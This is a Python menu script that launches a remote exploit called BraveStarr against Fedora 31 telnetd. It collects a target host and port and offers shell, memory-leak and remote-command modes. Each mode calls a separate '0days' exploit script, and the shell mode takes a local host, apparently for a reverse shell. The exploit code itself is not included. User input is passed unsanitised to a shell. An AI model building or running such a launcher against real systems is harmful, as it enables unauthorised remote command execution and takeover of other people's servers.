# BraveStarr -- Remote Fedora 31 telnetd exploit
import subprocess as sub


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    end = '\033[m'
    green = '\033[0;32m'


def main():
    while True:
        hostname = input(f"{Colors.red}(Bravestarr Fedora 31 Telnetd){Colors.end} [Enter Hostname]:~#")
        port = int(input(f"{Colors.red}(Bravestarr Fedora 31 Telnetd){Colors.end} [Enter Telnet Port]:~#"))
        method = input(
            f"{Colors.red}(Bravestarr Fedora 31 Telnetd){Colors.end} [Attack Method: (shell,  leak,  command)]:~#")
        if method == "command":
            remote_command = input(f"{Colors.red}(Bravestarr Fedora 31 Telnetd){Colors.end} [Enter Command]:~#")
            sub.call(f"python3 ../0days/bravestarr.py -H {hostname} -p {port} command {remote_command}", shell=True)
            break

        elif method == "shell":
            lhost = input(f"{Colors.red}(Bravestarr Fedora 31 Telnetd){Colors.end} [Enter Local Host]:~#")
            sub.call(f"python3 ../0days/bravestarr.py -H {hostname} -p {port} shell -c {lhost}", shell=True)
            break

        elif method == "leak":
            sub.call(f"python3 ../0days/bravestarr.py -H {hostname} -p {port} leak", shell=True)
            break


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        exit(0)
